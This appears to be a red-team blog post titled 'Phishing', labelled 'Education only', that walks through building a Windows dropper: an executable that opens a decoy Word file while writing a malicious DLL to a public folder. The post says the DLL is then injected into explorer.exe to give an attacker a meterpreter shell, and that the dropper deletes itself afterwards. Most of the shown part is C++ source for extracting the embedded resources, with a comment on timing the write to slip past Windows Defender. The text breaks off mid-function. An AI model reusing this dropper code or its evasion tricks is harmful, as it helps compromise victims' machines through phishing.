@@ -1,0 +1,976 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="** Education only **  Author: LeviathanDate: 11&#x2F;5&#x2F;2022  Virtual Machine Environment  Kali Linux IP: 192.168.107.128Windows Defender: 192.168.107.136Windows Huorong: 192.168.107.131Windows Te">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Phishing">
+<meta property="og:url" content="http://kelpie.top/post/[Red%20Team%20Development]%20Phishing.html">
+<meta property="og:site_name" content="Kelpie Blog">
+<meta property="og:description" content="** Education only **  Author: LeviathanDate: 11&#x2F;5&#x2F;2022  Virtual Machine Environment  Kali Linux IP: 192.168.107.128Windows Defender: 192.168.107.136Windows Huorong: 192.168.107.131Windows Te">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FujSELXIEdo_iEfaTPY0JyAU_Klf.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FpXbefLjurAaoeW08jXfBOEtDHoo.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fo4Vry1bjBPsHfSLzfWHAsdQyZDH.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FiYI-tuEohx8Id1wXS29Ac-jQ25C.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fncb0-mijJAqd7t0YfEYv7ipmp-T.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FkZYHnDxbqd_MKft1GX0f5LHUIdB.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FiqaVX2o2vuXJuQYmzoe47HiJVec.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fr9i0zYucV6nsQztl1QBkvQ0CTHL.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fv38g8E3dubV8mCO7i64Zccn8zXp.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FjtCDydblBjFy2iyRBkoN9BeOjVv.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fq-xGGrGe2I4UXLxz4o173jsUCOO.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fl8Gw9TcvDKRg_eoUYMzfl5Zt5VE.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FpXGiGZtLQjacqWgpDh-oW3bw-51.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FiEPmmkcmhKEordBkyMnmTz5Jtdt.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FpPpGkJWwODK2c_e3avrRn5CHT37.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Frty5NLFXdW7fuaeyrg2oKvRBgMR.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fp3o45AgE_eo2K_63ZDM8WUvFJjN.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FmtmL0PyzSDy1qKsZ7E-Bq8gTxkB.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fih-ebiDCxtfjNeCv8gEXjJ2UcBr.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FgYu_afzNnMZESCyWEJzPo2CS9Y4.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Foid3sKWxV71phGmH6taw74Z3gOD.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FsfSHJenf4dwnPeg0QBkbwUrHtAX.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FtepJCgX7JKmITDA1Ft0qa8NGA8g.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fsmrnpg2QSIyXcgapgJh1H8VNABr.png">
+<meta property="article:published_time" content="2022-11-15T23:29:33.000Z">
+<meta property="article:modified_time" content="2024-04-10T09:43:13.102Z">
+<meta property="article:author" content="l3vi4th4n">
+<meta property="article:tag" content="Red Team Development">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FujSELXIEdo_iEfaTPY0JyAU_Klf.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Phishing</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/post/Simple%20OS%20kernel.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/post/%5BCSAPP-Lab%5D%20DataLab.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/[Red%20Team%20Development]%20Phishing.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/[Red%20Team%20Development]%20Phishing.html&text=Phishing"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/[Red%20Team%20Development]%20Phishing.html&title=Phishing"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/[Red%20Team%20Development]%20Phishing.html&is_video=false&description=Phishing"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Phishing&body=Check out this article: http://kelpie.top/post/[Red%20Team%20Development]%20Phishing.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/[Red%20Team%20Development]%20Phishing.html&title=Phishing"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/[Red%20Team%20Development]%20Phishing.html&title=Phishing"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/[Red%20Team%20Development]%20Phishing.html&title=Phishing"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/[Red%20Team%20Development]%20Phishing.html&title=Phishing"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/[Red%20Team%20Development]%20Phishing.html&name=Phishing&description=&lt;p&gt;*&lt;strong&gt;* Education only **&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Author: Leviathan&lt;br&gt;Date: 11&amp;#x2F;5&amp;#x2F;2022&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Virtual Machine Environment&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Kali Linux IP: 192.168.107.128&lt;br&gt;Windows Defender: 192.168.107.136&lt;br&gt;Windows Huorong: 192.168.107.131&lt;br&gt;Windows Tencent Anti-Virus: 192.168.107.1&lt;/p&gt;
+&lt;/blockquote&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/[Red%20Team%20Development]%20Phishing.html&t=Phishing"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Program-Analysis"><span class="toc-number">1.</span> <span class="toc-text">Program Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Executable-procedure"><span class="toc-number">1.1.</span> <span class="toc-text">Executable procedure</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phishing-part"><span class="toc-number">1.2.</span> <span class="toc-text">Phishing part</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#How-we-store-the-Word-file-in-executable-file"><span class="toc-number">1.2.1.</span> <span class="toc-text">How we store the Word file in executable file?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#How-we-realse-resources"><span class="toc-number">1.2.2.</span> <span class="toc-text">How we realse resources?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#How-we-inject-the-malicious-in-explorer-exe-process"><span class="toc-number">1.2.3.</span> <span class="toc-text">How we inject the malicious in explorer.exe process?</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Escalate-Privilege-part"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">Escalate Privilege part</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Inject-DLL-part"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">Inject DLL part</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass-Part"><span class="toc-number">1.3.</span> <span class="toc-text">Bypass Part</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#How-to-create-malicious-DLL-file"><span class="toc-number">1.3.1.</span> <span class="toc-text">How to create malicious DLL file?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ShellCode-Encryption"><span class="toc-number">1.3.2.</span> <span class="toc-text">ShellCode Encryption</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Huorong-Bypass"><span class="toc-number">1.4.</span> <span class="toc-text">Huorong Bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass-Windows-Defender"><span class="toc-number">1.5.</span> <span class="toc-text">Bypass Windows Defender</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Summary"><span class="toc-number">2.</span> <span class="toc-text">Summary</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Phishing
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">l3vi4th4n</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-11-15T23:29:33.000Z" class="dt-published" itemprop="datePublished">2022-11-15</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Red-Team/">Red-Team</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Red-Team-Development/" rel="tag">Red Team Development</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>*<strong>* Education only **</strong></p>
+<blockquote>
+<p>Author: Leviathan<br>Date: 11&#x2F;5&#x2F;2022</p>
+</blockquote>
+<p>Virtual Machine Environment</p>
+<blockquote>
+<p>Kali Linux IP: 192.168.107.128<br>Windows Defender: 192.168.107.136<br>Windows Huorong: 192.168.107.131<br>Windows Tencent Anti-Virus: 192.168.107.1</p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="Program-Analysis"><a href="#Program-Analysis" class="headerlink" title="Program Analysis"></a>Program Analysis</h1><h2 id="Executable-procedure"><a href="#Executable-procedure" class="headerlink" title="Executable procedure"></a>Executable procedure</h2><ol>
+<li>When we open the executable file, we will get the Word file window which looks like as normal Document file be opened, at the same time we extract the malicious DLL file in directory public download.</li>
+<li>We will inject malicious DLL file in explorer.exe, and hacker will get the meterpreter shell in his machine.</li>
+<li>Delete itself and remain normal Word file in victim machine</li>
+</ol>
+<h2 id="Phishing-part"><a href="#Phishing-part" class="headerlink" title="Phishing part"></a>Phishing part</h2><h3 id="How-we-store-the-Word-file-in-executable-file"><a href="#How-we-store-the-Word-file-in-executable-file" class="headerlink" title="How we store the Word file in executable file?"></a>How we store the Word file in executable file?</h3><p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FujSELXIEdo_iEfaTPY0JyAU_Klf.png"><br>Visual Studio -&gt; Resources Files -&gt; Add -&gt; Resouce -&gt; import -&gt; choose your Word file -&gt; input docx type</p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FpXbefLjurAaoeW08jXfBOEtDHoo.png"></p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fo4Vry1bjBPsHfSLzfWHAsdQyZDH.png"></p>
+<p>Malicious DLL is the same way to store itself in executable file.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FiYI-tuEohx8Id1wXS29Ac-jQ25C.png"></p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fncb0-mijJAqd7t0YfEYv7ipmp-T.png"></p>
+<h3 id="How-we-realse-resources"><a href="#How-we-realse-resources" class="headerlink" title="How we realse resources?"></a>How we realse resources?</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Initialize the variables</span>
+	<span class="token keyword">char</span> PathFileName<span class="token punctuation">[</span>MAX_PATH<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+	<span class="token keyword">char</span> FileName<span class="token punctuation">[</span>MAX_PATH<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+	<span class="token keyword">char</span> Dllpath<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>MAX_PATH<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"C:\\Users\\Public\\Downloads\\acvfunc.dll"</span><span class="token punctuation">;</span>
+	<span class="token keyword">char</span> FileType<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+<span class="token comment">// Word File Resource Variables</span>
+	HRSRC Resource<span class="token punctuation">;</span>
+	HGLOBAL ResourceGlobal<span class="token punctuation">;</span>
+	DWORD FileSize<span class="token punctuation">;</span>
+
+<span class="token comment">// DLL File Resource Variables</span>
+	HRSRC DLL_Resource<span class="token punctuation">;</span>
+	HGLOBAL DLL_ResourceGlobal<span class="token punctuation">;</span>
+	DWORD DLL_FileSize<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Find the resource in executable file, load and lock them in void pointer</p>
+<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// FindResourceA</span>
+<span class="token comment">// LoadResource</span>
+	Resource <span class="token operator">=</span> <span class="token function">FindResourceA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token function">MAKEINTRESOURCEA</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"docx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	DLL_Resource <span class="token operator">=</span> <span class="token function">FindResourceA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token function">MAKEINTRESOURCEA</span><span class="token punctuation">(</span><span class="token number">102</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"dll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+	ResourceGlobal <span class="token operator">=</span> <span class="token function">LoadResource</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> Resource<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	DLL_ResourceGlobal <span class="token operator">=</span> <span class="token function">LoadResource</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> DLL_Resource<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+	FileSize <span class="token operator">=</span> <span class="token function">SizeofResource</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> Resource<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	DLL_FileSize <span class="token operator">=</span> <span class="token function">SizeofResource</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> DLL_Resource<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">// Lock the resource in void* pointer</span>
+	LPVOID PFILE <span class="token operator">=</span> <span class="token function">LockResource</span><span class="token punctuation">(</span>ResourceGlobal<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	LPVOID Shellcode_Buf <span class="token operator">=</span> <span class="token function">LockResource</span><span class="token punctuation">(</span>DLL_ResourceGlobal<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>I create the file name as the program name, guys can modify any names you wanna.</p>
+<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Get the program name</span>
+	<span class="token function">GetModuleFileNameA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> PathFileName<span class="token punctuation">,</span> MAX_PATH<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">strcpy_s</span><span class="token punctuation">(</span>FileName<span class="token punctuation">,</span> <span class="token function">strrchr</span><span class="token punctuation">(</span>PathFileName<span class="token punctuation">,</span> <span class="token char">'\\'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+<span class="token comment">// phishing.exe -> phishing.docx</span>
+<span class="token comment">// modify the suffix</span>
+	<span class="token keyword">for</span> <span class="token punctuation">(</span>size_t i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> MAX_PATH<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
+	<span class="token punctuation">&#123;</span>
+		<span class="token keyword">if</span> <span class="token punctuation">(</span>FileName<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'.'</span><span class="token punctuation">)</span>
+		<span class="token punctuation">&#123;</span>
+			FileName<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'d'</span><span class="token punctuation">;</span>
+			FileName<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'o'</span><span class="token punctuation">;</span>
+			FileName<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'c'</span><span class="token punctuation">;</span>
+			FileName<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'x'</span><span class="token punctuation">;</span>
+			<span class="token keyword">break</span><span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span>
+	<span class="token punctuation">&#125;</span>
+
+	<span class="token comment">// Create a file and write the resource in it</span>
+	HANDLE FILE <span class="token operator">=</span> <span class="token function">CreateFileA</span><span class="token punctuation">(</span>FileName<span class="token punctuation">,</span> FILE_ALL_ACCESS<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> CREATE_ALWAYS<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	DWORD dwSize<span class="token punctuation">;</span>
+	<span class="token function">WriteFile</span><span class="token punctuation">(</span>FILE<span class="token punctuation">,</span> PFILE<span class="token punctuation">,</span> FileSize<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwSize<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Open the Word file with ShellExecuteExA function</p>
+<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// open the docx file</span>
+SHELLEXECUTEINFOA shellexc <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+shellexc<span class="token punctuation">.</span>cbSize <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>shellexc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+shellexc<span class="token punctuation">.</span>lpFile <span class="token operator">=</span> FileName<span class="token punctuation">;</span>
+shellexc<span class="token punctuation">.</span>nShow <span class="token operator">=</span> SW_SHOW<span class="token punctuation">;</span>
+<span class="token function">ShellExecuteExA</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>shellexc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">// Donot forget close handle or you will get wrong :-(</span>
+<span class="token function">CloseHandle</span><span class="token punctuation">(</span>FILE<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Write Malicious DLL file in public path</p>
+<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Sleep(10000);</span>
+<span class="token comment">// To bypass Windows Deferder, Windows defender will scan the file in 10s when you execute the file as an administrator privilege.</span>
+HANDLE DLLFILE <span class="token operator">=</span> <span class="token function">CreateFileA</span><span class="token punctuation">(</span>Dllpath<span class="token punctuation">,</span> FILE_ALL_ACCESS<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> CREATE_ALWAYS<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+DWORD dllSize<span class="token punctuation">;</span>
+<span class="token function">WriteFile</span><span class="token punctuation">(</span>DLLFILE<span class="token punctuation">,</span> Shellcode_Buf<span class="token punctuation">,</span> DLL_FileSize<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dllSize<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">CloseHandle</span><span class="token punctuation">(</span>DLLFILE<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Whole release resource function</p>
+<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression">once</span></span>
+
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"Basic.h"</span></span>
+
+<span class="token comment">// "Basic.h" include Windows.h and iostream</span>
+
+<span class="token keyword">void</span> <span class="token function">free_resource</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+	<span class="token comment">// Get File Name</span>
+	<span class="token keyword">char</span> PathFileName<span class="token punctuation">[</span>MAX_PATH<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+	<span class="token keyword">char</span> FileName<span class="token punctuation">[</span>MAX_PATH<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+	<span class="token keyword">char</span> Dllpath<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>MAX_PATH<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"C:\\Users\\Public\\Downloads\\acvfunc.dll"</span><span class="token punctuation">;</span>
+	<span class="token keyword">char</span> FileType<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+	HRSRC Resource<span class="token punctuation">;</span>
+	HGLOBAL ResourceGlobal<span class="token punctuation">;</span>
+	DWORD FileSize<span class="token punctuation">;</span>
+
+
+	HRSRC DLL_Resource<span class="token punctuation">;</span>
+	HGLOBAL DLL_ResourceGlobal<span class="token punctuation">;</span>
+	DWORD DLL_FileSize<span class="token punctuation">;</span>
+
+	Resource <span class="token operator">=</span> <span class="token function">FindResourceA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token function">MAKEINTRESOURCEA</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"docx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	DLL_Resource <span class="token operator">=</span> <span class="token function">FindResourceA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token function">MAKEINTRESOURCEA</span><span class="token punctuation">(</span><span class="token number">102</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"dll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
